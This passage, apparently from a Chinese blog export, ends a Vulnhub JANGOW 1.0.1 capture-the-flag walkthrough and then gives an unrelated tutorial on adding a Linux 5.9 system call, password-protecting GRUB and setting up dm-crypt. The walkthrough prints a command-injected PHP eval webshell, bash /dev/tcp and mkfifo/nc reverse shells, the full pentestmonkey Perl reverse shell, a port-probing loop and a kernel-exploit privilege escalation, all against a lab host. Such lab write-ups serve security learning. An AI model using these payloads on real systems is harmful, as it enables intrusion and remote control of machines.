<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.159.152/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%207.jpg" /></p>
<h3 id="尝试写个-webshell">2.2. 尝试写个 webshell</h3>
<ul>
<li>由于能正常解析PHP文件，所以写个PHP木马，用蚁剑连接测试。</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">&#x27;&lt;?php eval(<span class="variable">$_POST</span>[&quot;shell&quot;]);&#x27;</span> &gt; webshell.php</span><br></pre></td></tr></table></figure>
<p>即
<code>http://192.168.159.153/site/busque.php?buscar=echo '&lt;?php eval($_POST["shell"]);' &gt; webshell.php</code>
，执行完后用 <code>ls</code> 看有没有写入成功。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%208.jpg" /></p>
<p>成功写入，蚁剑连接。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%209.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2011.jpg" /></p>
<p>有个 WP ，看下配置文件 <code>/wordpress/config.php</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2012.jpg" /></p>
<p>又发现个数据库连接的信息，浏览器访问测试下发现是错的，不过记下这个账号和密码或许有用。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2013.jpg" /></p>
<p>访问文件发现了第一个 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2014.jpg" /></p>
<p>权限太低，考虑再次反弹 shell 并提权。</p>
<h3 id="利用蚁剑反弹-shell">2.3. 利用蚁剑反弹 shell</h3>
<p>试了好几种 shell 均失败了，卡住了……
看了看其它人的解法，说是对端口做了限制，只有 443 能用…… 学下 <a
href="https://www.cnblogs.com/sainet/p/15642784.html#1%E4%BD%BF%E7%94%A8nmap%E5%AF%B9%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F">sainet</a>
的处理方式，先将攻击机1-65535端口绑定至某一特定端口，然后再靶机跑脚本测试端口。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 4444</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2015.jpg" /></p>
<p>kali 开启侦听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvnp 4444</span></span><br></pre></td></tr></table></figure>
<p>靶机用蚁剑新建脚本【port_script.sh】，赋予执行权限并执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..65534&#125;;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   <span class="built_in">timeout</span> 1 nc -vz 192.168.159.152 <span class="variable">$i</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span> open&quot;</span> &gt;&gt; out.txt  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span> close&quot;</span> &gt;&gt; out.txt;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2017.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2016.jpg" /></p>
<p>删除 iptables 规则，基于 443 端口进一步反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -nvL</span><br></pre></td></tr></table></figure>
<p>用蚁剑上传 perl-reverse-shell.pl 反弹【端口修改成443】
perl-reverse-shell.pl</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="comment"># Copyright (C) 2006 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment"># for any actions performed using this tool.  The author accepts no liability</span></span><br><span class="line"><span class="comment"># for damage caused by this tool.  If these terms are not acceptable to you, then</span></span><br><span class="line"><span class="comment"># do not use this tool.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In all other respects the GPL version 2 applies:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"># it under the terms of the GNU General Public License version 2 as</span></span><br><span class="line"><span class="comment"># published by the Free Software Foundation.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"># GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment"># with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment"># 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment"># for any actions performed using this tool.  If these terms are not acceptable to</span></span><br><span class="line"><span class="comment"># you, then do not use this tool.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You are encouraged to send comments, improvements or suggestions to</span></span><br><span class="line"><span class="comment"># me at pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Description</span></span><br><span class="line"><span class="comment"># -----------</span></span><br><span class="line"><span class="comment"># This script will make an outbound TCP connection to a hardcoded IP and port.</span></span><br><span class="line"><span class="comment"># The recipient will be given a shell running as the current user (apache normally).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell.  Change these.</span></span><br><span class="line"><span class="comment"># reverse是反向的意思，这里的方向定义的规则是：</span></span><br><span class="line"><span class="comment"># 攻击者对靶机的攻击是正向，靶机向攻击者发送请求是反向</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">&#x27;192.168.159.152&#x27;</span>;   <span class="comment"># 向攻击者的ip发送连接请求</span></span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">443</span>;         <span class="comment"># 向攻击者的ip的某端口发送连接请求</span></span><br><span class="line"><span class="comment"># 攻击者需要他提前开启侦听12345端口，也就是使用瑞士军刀命令工具：nc -lvvp 12345</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any </span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="regexp">qr(^127\.0\.0\.1$)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declarations</span></span><br><span class="line"><span class="keyword">my</span> $global_page = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $fake_process_name = <span class="string">&quot;/usr/sbin/apache&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change the process name to be less conspicious</span></span><br><span class="line">$0 = <span class="string">&quot;[httpd]&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">defined</span>($ENV&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125;)) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Browser IP address appears to be: $ENV&#123;&#x27;REMOTE_ADDR&#x27;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">&quot;ERROR: Your client isn&#x27;t authorised to view this page&quot;</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;ERROR: Authentication is enabled, but I couldn&#x27;t determine your IP address.  Denying access&quot;</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">&#x27;tcp&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Sent reverse shell to $ip:$port&quot;</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">&quot;Couldn&#x27;t open reverse shell to $ip:$port: $!&quot;</span>);</span><br><span class="line">    cgiexit();  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;SOCK&quot;</span>);</span><br><span class="line">$ENV&#123;<span class="string">&#x27;HISTFILE&#x27;</span>&#125; = <span class="string">&#x27;/dev/null&#x27;</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;w;uname -a;id;pwd&quot;</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">&quot;/bin/sh&quot;</span>&#125; ($fake_process_name, <span class="string">&quot;-i&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">&quot;&lt;p&gt;\n&quot;</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don&#x27;t give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Content-Length: &quot;</span> . <span class="keyword">length</span>($global_page) . <span class="string">&quot;\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Type: text\/html\r\n\r\n&quot;</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行效果</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2018.jpg" /></p>
<p>很明显权限不足，需考虑提权。</p>
<h3 id="shell-补充">2.4. shell 补充</h3>
<p>此处 shell 反弹有多种方式，再举 2 个例子 kali 先开启 443 的监听
其一，蚁剑终端执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f/bin/sh -i 2&gt;&amp;1nc 192.168.159.152 443 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2024.jpg" /></p>
<p>其二，新建一个 php 文件，内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f/bin/sh -i 2&gt;&amp;1nc 192.168.159.152 443 &gt;/tmp/f&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>浏览器访问触发</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2025.jpg" /></p>
<p>这个shell也是有局限性的，可以调用本地终端获取更高级的交互 shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2026.jpg" /></p>
<p>注，反弹 shell
是提权所需，另外用户的切换登录也是需要调用本地终端来实现的！</p>
<h3 id="提权">2.5. 提权</h3>
<p>获取系统版本信息，以便查找提权漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment">#查看内核版本</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment">#当前系统发行版的具体版本号</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2019.jpg" /></p>
<p>依据版本找漏洞<a href="https://www.exploit-db.com/">Exploit Database
- Exploits for Penetration Testers, Researchers, and Ethical
Hackers</a></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2020.jpg" /></p>
<p>将下载的 45010.c，用蚁剑传至靶机，并用 gcc 编译</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2021.jpg" /></p>
<p>蚁剑的虚拟终端不能直接执行 exp 提权，用刚才反弹获得的 shell 提权</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2022.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2023.jpg" /></p>
<p>获得根目录下的 flag
。【提权并不是一帆风顺，漏洞试了好几个只有这个成功了】</p>
<h3 id="ftp-登录测试">2.6. ftp 登录测试</h3>
<p>最后补充点，前面知道了 21
端口是开放的，尝试用前面得到的用户信息登录，发现只有
<code>jangow01/abygurl69</code>
能进去，但权限也很小，文件也上传不了……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2027.jpg" /></p>
<p>再用前面的 shell 试下终端权限 <img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/JANGOW%201.0.1%20-%2028.jpg" /></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统调用的添加</title>
    <url>/2022/03/30/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/</url>
    <content><![CDATA[<h2 id="实验环境">1. 实验环境</h2>
<p><strong>虚拟机：</strong>Ubuntu 64 位（Ubuntu-20.10-desktop-amd64.iso
+ Linux-5.8）</p>
<p><strong>待编译的Linux内核：</strong>linux-5.9版(linux-5.9-tar.gz)</p>
<h2 id="实验步骤">2. 实验步骤</h2>
<h3 id="概述">1、概述</h3>
<p>首先在虚拟机中安装Ubuntu 64 位操作系统,并在该虚拟中安装vm
tools以方便主机与虚拟机之间实现复制粘贴等功能，安装相关依赖库以及gcc等基本工具，下载linux-5.9版的内核，复制压缩包到/usr/src下，并解压（也可直接解压到/usr/src下），编译内核，安装内核，重启，在下载的Linux-5.9内核源码中添加自己的系统调用，重新编译内核，安装内核，重启，测试系统调用。对GRUB引导实现加密，在linux-5.9的内核中创建一个加密的文件系统。</p>
<h3 id="流程图">2、流程图</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_6244145de70e6.png" /></p>
<h3 id="准备阶段">3、准备阶段</h3>
<h4
id="安装虚拟机ubuntu-64-位ubuntu-20.10-desktop-amd64.iso">(1)安装虚拟机Ubuntu
64 位（Ubuntu-20.10-desktop-amd64.iso）</h4>
<h4
id="安装各种依赖库及工具终端窗口使用命令">(2)安装各种依赖库及工具（终端窗口使用命令）</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su //获取root权限</span><br><span class="line">apt-get install make</span><br><span class="line">apt-get install gcc</span><br><span class="line">apt-get install libncurses5-dev libssl-dev</span><br><span class="line">apt-get install build-essential openssl</span><br><span class="line">apt-get install zlibc minizip</span><br><span class="line">apt-get install libidn11-dev libidn11</span><br><span class="line">apt-get install bison</span><br><span class="line">apt-get install flex</span><br></pre></td></tr></table></figure>
<h4
id="下载linux内核httpsmirror.bjtu.edu.cnkernellinuxkernel备注安装时如果失败更新下系统源apt-get-update">(3)
下载Linux内核：https://mirror.bjtu.edu.cn/kernel/linux/kernel（<strong>备注：</strong>安装时如果失败，更新下系统源（apt-get
update））</h4>
<h4 id="在文件系统下载目录下打开终端窗口使用以下命令">(4)
在文件系统下载目录下打开终端窗口，使用以下命令：</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su //获取root权限</span><br><span class="line"><span class="built_in">cp</span> linux-5.9.tar.gz /usr/src //复制压缩包到/usr/src下</span><br><span class="line"><span class="built_in">cd</span> /usr/src</span><br><span class="line">tar -xvf linux-5.9.tar.gz //解压Linux-5.9内核</span><br></pre></td></tr></table></figure>
<h3 id="编程实现">4、编程实现</h3>
<h4 id="添加系统调用阶段">(1).添加系统调用阶段</h4>
<ul>
<li>首先，定义自己的系统调用，即在sys.c中添加自己的系统调用，如下代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">asmlinkage <span class="type">void</span> __x64_sys_helloworld(<span class="type">void</span>)<span class="comment">//__x64_务必加上！！！</span></span><br><span class="line"> &#123;</span><br><span class="line">        printk(<span class="string">&quot;Hello World!&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_6244168841331.png" /></p>
<p><strong>备注：</strong>__x64_务必加上的原因，由于此版本的系统调用会自动创建加上__x64_，如果未加则系统调用helloworld时会报__x64_sys_helloworld未定义的错误(自己第一次搞时也未加，直到编译内核阶段报错后才发现的)；</p>
<ul>
<li>其次，声明调用，在syscalls.h中加入如下声明：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">asmlinkage <span class="type">long</span> <span class="title function_">sys_hello</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_624416a2b2b0e.png" /></p>
<ul>
<li>最后，设置系统调用号：</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441613b4fb4.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_6244162c38a03.png" /></p>
<h4 id="编译内核阶段">(2).编译内核阶段:</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make mrproper //清除.config等文件</span><br><span class="line"></span><br><span class="line">make clean //清楚大多数编译文件</span><br><span class="line"></span><br><span class="line">make menuconfig //对内核选项进行配置Save→OK→EXIT→EXIT</span><br><span class="line"></span><br><span class="line">make -j4 bzImage //编译内核(开启多线程编译速度快)</span><br><span class="line"></span><br><span class="line">make -j4 modules //编译模块</span><br><span class="line"></span><br><span class="line">make modules_install //安装模块</span><br><span class="line"></span><br><span class="line">make install //由系统自动完善</span><br></pre></td></tr></table></figure>
<h4
id="编译过程中出现的问题及解决方法①②是linux-5.9编译时遇到的报错②之后的问题是自己编译低版本内核时遇到的问题"><strong>(3).</strong>编译过程中出现的问题及解决方法（①②是Linux-5.9编译时遇到的报错，②之后的问题是自己编译低版本内核时遇到的问题）：</h4>
<p>①　BTF: .tmp_vmlinux.btf: pahole (pahole) is not available Failed to
generate BTF for vmlinux Try to disable CONFIG_DEBUG_INFO_BTF make[1]:
*** [/home/demo_accout/linux-5.9……
<strong>解决方法：</strong>这是由.config配置文件配置项错误导致的，修改配置文件，把之前的CONFIG_DEBUG_INFO_BTF=y改成CONFIG_DEBUG_INFO_BTF=n即可；</p>
<p>②　__x64_问题（系统调用添加时已备注）</p>
<p>③　code model kernel does not support PIC mode
解决方法：在顶层makefile中添加编译选项 -fno-pie</p>
<p>④　gcc.…… linux/compiler-gcc10.h: No such file or directory
<strong>解决方法：</strong>修改compiler-gcc.h文件，将#include
gcc_header(GNUC)修改为#include
gcc_header(4)。也可再下载个低版本GCC搞个交叉链接的方法解决（我用的是前者）。</p>
<p>⑤　init/do_mounts.o:…… first defined here
<strong>解决方法：</strong>根据错误提示定位到相应文件的行数，将extern改为static。</p>
<p>⑥　TIMEC   kernel/timeconst.h Can't use 'defined(<span
class="citation" data-cites="array">@array</span>)' ……
kernel/timeconst.pl line 373.
<strong>解决方法：</strong>去掉该行的defined，变成……if (!(<span
class="citation" data-cites="val">@val</span>)) ……即可。</p>
<p>⑦　……Error: 4-byte relocation cannot be applied to 2-byte field
<strong>解决方法：</strong>安装个低版本gcc编译器（建议换个高版本内核）</p>
<h4
id="重启reboot选择linux-5.9的内核启动即可">(4).重启（reboot）选择Linux-5.9的内核启动即可。</h4>
<h3 id="测试结果与分析">5、测试结果与分析</h3>
<h4 id="新建系统调用程序a.c">(1).新建系统调用程序A.c</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"> &#123; </span><br><span class="line">      <span class="type">long</span> <span class="type">int</span> a = syscall(<span class="number">336</span>); </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;System call Success, and it returns %ld\n&quot;</span>,a); </span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h4 id="编译执行">(2).编译执行</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc A.c  //编译A.c(2).使用gcc编译A.c生成a.out,执行a.out后，接着输入dmesg查看进程信息。</span><br><span class="line">./a.out   //执行a.out</span><br><span class="line">dmesg     //查看进程调用的信息(下图倒数第二行说明调用成功)</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_624418685628c.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_624418d05147e.png" /></p>
<h3 id="拓展">6、拓展</h3>
<h4 id="对grub加密保护">(1) 对GRUB加密(保护)</h4>
<p>首先设置GRUB密码。终端窗口执行：grub-mkpasswd-pbkdf2，系统将提示创建并验证GRUB的密码（密码输入两次，如下图）。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_624419a804fe4.png" /></p>
<p>其次将生成的以grub开头的哈希密码复制下来，接着将新哈希添加到00_header文件中。终端执行命令：sudo
gedit /etc/grub.d/00_header 在该文件的末尾，添加以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">set superusers=&quot;admin&quot;</span></span><br><span class="line"><span class="string">password_pbkdf2 admin grub.pbkdf2.sha512.10000.…………</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
<p>保存并关闭该文件。使用命令sudo update-grub更新GRUB；
<strong>注意：</strong>哈希密码务必复制对，否则内核就打不开了。
最后重新启动系统。Ubuntu初始屏幕出现后不久，系统会提示您输入用户名。在上面的配置中，我创建了admin用户。输入用户名后，按Enter键，系统将提示输入密码（如下图）。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441a1851edc.png" /></p>
<p>密码正确则出现下图(选择相应内核启动即可)：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441a2e25c4f.png" /></p>
<h4 id="在linux-5.9的内核中创建一个加密的文件系统dm-crypt"><strong>(2)
在linux-5.9的内核中创建一个加密的文件系统（dm-crypt）</strong></h4>
<p>首先配置内核： 使用命令：cat /proc/crypto
检查内核是否已经加载AES密码模块</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441a7bd3cdd.png" /></p>
<p>接下来安装dmsetup软件包，该软件包含有配置device-mapper所需的工具：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install dmsetup cryptsetup</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441aa232374.png" /></p>
<p>为检查dmsetup软件包是否已经建立了设备映象程序，键入下列命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /dev/mapper/control</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441ac8c1d11.png" /></p>
<p>接着使用命令：modprobe
dm-crypt加载dm-crypt内核模块，dm-crypt加载后，它会用evice-mapper自动注册。如果再次检验的话，device-mapper已能识别dm-crypt，并且把crypt
添加为可用的对象,再输入命令：sudo dmsetup
targets(下图说明系统已为装载加密设备做好了准备)。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441aec37855.png" /></p>
<p>其次建立加密设备（建立一个磁盘映像，然后作为回送设备加载）：
